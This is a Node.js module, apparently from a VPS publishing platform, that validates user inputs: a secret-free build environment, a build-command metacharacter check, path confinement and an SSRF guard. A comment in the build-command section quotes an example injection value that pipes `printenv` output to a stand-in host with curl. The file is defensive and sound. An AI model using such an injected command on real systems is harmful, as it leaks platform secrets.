'use strict';

/**
 * hosting/safety — input-validation guards for the publisher feature.
 *
 * The publisher lets a user deploy their OWN repo to their OWN VPS, but several
 * inputs reach dangerous sinks on the PLATFORM host (a local build spawn, an
 * nginx config the platform writes, SSH/SFTP connects the platform initiates).
 * These guards keep user input from (a) executing arbitrary commands on the
 * platform host, (b) leaking platform secrets into an untrusted build, (c)
 * pivoting the platform's SSH/HTTP client onto internal infrastructure (SSRF),
 * or (d) escaping the intended directory.
 */

const dns = require('node:dns').promises;
const net = require('node:net');

// ── 1. Build env scrub ───────────────────────────────────────────────────────
// A user-supplied repo's install/build scripts run on the platform host. They
// MUST NOT inherit the platform's secrets (ENCRYPTION_KEY seals every user's
// hosting creds; JWT_SECRET, STRIPE_*, DATABASE_URL, etc.). Build a minimal env
// from an allowlist instead of spreading process.env.
const ENV_ALLOWLIST = new Set([
  'PATH', 'HOME', 'LANG', 'LANGUAGE', 'LC_ALL', 'LC_CTYPE', 'TZ', 'TERM',
  'TMPDIR', 'TEMP', 'TMP', 'SHELL', 'USER', 'LOGNAME', 'PWD', 'HOSTNAME',
  // Windows essentials
  'SYSTEMROOT', 'SYSTEMDRIVE', 'WINDIR', 'COMSPEC', 'PATHEXT', 'APPDATA',
  'LOCALAPPDATA', 'USERPROFILE', 'PROGRAMFILES', 'PROGRAMDATA', 'NUMBER_OF_PROCESSORS',
]);

/**
 * Minimal, secret-free environment for an untrusted build/run spawn. Inherits
 * only allowlisted host vars, then layers the build's own npm flags and the
 * user's (already-sealed, project-scoped) build env on top.
 */
function scrubbedBuildEnv(extraEnv = {}, base = process.env) {
  const env = {};
  for (const k of ENV_ALLOWLIST) {
    if (base[k] !== undefined) env[k] = base[k];
  }
  env.CI = '1';
  env.FORCE_COLOR = '0';
  env.npm_config_include = 'dev';
  env.npm_config_production = 'false';
  env.npm_config_fund = 'false';
  env.npm_config_audit = 'false';
  // User build secrets (VITE_*, etc.) — explicitly provided, project-scoped.
  for (const [k, v] of Object.entries(extraEnv || {})) {
    if (typeof k === 'string' && k) env[k] = String(v);
  }
  return env;
}

// ── 2. Build-command validation ──────────────────────────────────────────────
// buildCommand is concatenated into `npm install && <cmd>` and run with a shell
// on the platform host. Reject anything with shell metacharacters so a value
// like `true; curl evil -d "$(printenv)"` can't break out. Legitimate build
// commands (`npm run build`, `vite build --mode production`) use none of these.
const SHELL_METACHARS = /[;&|`$(){}<>\n\r\\'"!*?~#]/;
function assertSafeBuildCommand(cmd) {
  if (cmd === undefined || cmd === null || cmd === '') return cmd;
  const s = String(cmd);
  if (s.length > 500) throw badInput('buildCommand demasiado largo');
  if (s.includes('\0') || SHELL_METACHARS.test(s)) {
    throw badInput('buildCommand contiene caracteres no permitidos (solo letras, números y - _ . / : = , @ espacio)');
  }
  return s;
}

// ── 3. Relative-path (output dir) confinement ────────────────────────────────
// outputDir is joined onto the local build path; reject absolute paths and `..`
// so a build can't read/upload files outside its own workspace.
function assertSafeRelPath(p, field = 'outputDir') {
  if (p === undefined || p === null || p === '' || p === '.') return p;
  const s = String(p);
  if (s.includes('\0') || s.length > 400) throw badInput(`${field} inválido`);
  if (net.isIP(s)) { /* not a path */ }
  if (s.startsWith('/') || /^[A-Za-z]:[\\/]/.test(s) || s.split(/[\\/]/).some((seg) => seg === '..')) {
    throw badInput(`${field} no puede ser absoluto ni contener ".."`);
  }
  return s;
}

// ── 4. Remote-path / nginx webroot validation ────────────────────────────────
// remotePath/webroot is interpolated raw into an nginx server block the PLATFORM
// writes onto the VPS (`root ${webroot};`). Restrict to a POSIX path charset so
// a value can't inject nginx directives or shell metacharacters.
const REMOTE_PATH_RE = /^\/?[A-Za-z0-9._/-]+$/;
function assertSafeRemotePath(p, field = 'remotePath') {
  if (p === undefined || p === null || p === '') return p;
  const s = String(p);
  if (s.length > 512 || s.includes('\0') || !REMOTE_PATH_RE.test(s) || s.split('/').some((seg) => seg === '..')) {
    throw badInput(`${field} inválido (solo letras, números y . _ - / )`);
  }
  return s;
}

// ── 5. SSRF guard for SSH/SFTP/FTP/HTTP targets ──────────────────────────────
function ipIsPrivate(ip) {
  if (net.isIPv4(ip)) {
    const o = ip.split('.').map(Number);
    if (o[0] === 10) return true;
    if (o[0] === 127) return true; // loopback
    if (o[0] === 0) return true;
    if (o[0] === 169 && o[1] === 254) return true; // link-local / cloud metadata
    if (o[0] === 172 && o[1] >= 16 && o[1] <= 31) return true;
    if (o[0] === 192 && o[1] === 168) return true;
    if (o[0] === 100 && o[1] >= 64 && o[1] <= 127) return true; // CGNAT
    if (o[0] >= 224) return true; // multicast / reserved
    return false;
  }
  if (net.isIPv6(ip)) {
    const x = ip.toLowerCase();
    if (x === '::1' || x === '::') return true;
    if (x.startsWith('fe80') || x.startsWith('fc') || x.startsWith('fd')) return true; // link-local / ULA
    // IPv4-mapped (::ffff:a.b.c.d)
    const m = x.match(/::ffff:(\d+\.\d+\.\d+\.\d+)$/);
    if (m) return ipIsPrivate(m[1]);
    return false;
  }
  return false;
}

/**
 * Reject hosts that resolve to private/reserved/metadata addresses, so the
 * platform's SSH/SFTP/FTP/HTTP client can't be aimed at internal infrastructure.
 * IP literals are checked directly; hostnames are DNS-resolved (all records).
 * Set HOSTING_SSRF_GUARD_DISABLED=1 to bypass (e.g. self-hosted LAN deploys).
 */
async function assertSafeRemoteHost(host, { lookup } = {}) {
  if (process.env.HOSTING_SSRF_GUARD_DISABLED === '1') return;
  const h = String(host || '').trim().replace(/^\[|\]$/g, '');
  if (!h) throw badInput('host requerido');
  if (h.length > 255) throw badInput('host inválido');
  if (net.isIP(h)) {
    if (ipIsPrivate(h)) throw blocked(h);
    return;
  }
  // Hostname → resolve and check every address.
  const resolver = lookup || ((name) => dns.lookup(name, { all: true, verbatim: true }));
  let addrs;
  try {
    addrs = await resolver(h);
  } catch {
    throw badInput(`no se pudo resolver el host "${h}"`);
  }
  const list = Array.isArray(addrs) ? addrs : [addrs];
  for (const a of list) {
    const ip = typeof a === 'string' ? a : a.address;
    if (ip && ipIsPrivate(ip)) throw blocked(h);
  }
}

/** Async guard for a full URL (used by domain verification). */
async function assertSafeUrl(rawUrl, opts) {
  let u;
  try { u = new URL(String(rawUrl)); } catch { throw badInput('URL inválida'); }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') throw badInput('solo http/https');
  await assertSafeRemoteHost(u.hostname, opts);
  return u;
}

function badInput(message) {
  const e = new Error(message);
  e.status = 400;
  e.code = 'invalid_input';
  return e;
}
function blocked(host) {
  const e = new Error(`destino no permitido: "${host}" resuelve a una dirección interna/reservada`);
  e.status = 400;
  e.code = 'host_blocked';
  return e;
}

module.exports = {
  scrubbedBuildEnv,
  assertSafeBuildCommand,
  assertSafeRelPath,
  assertSafeRemotePath,
  assertSafeRemoteHost,
  assertSafeUrl,
  ipIsPrivate,
};
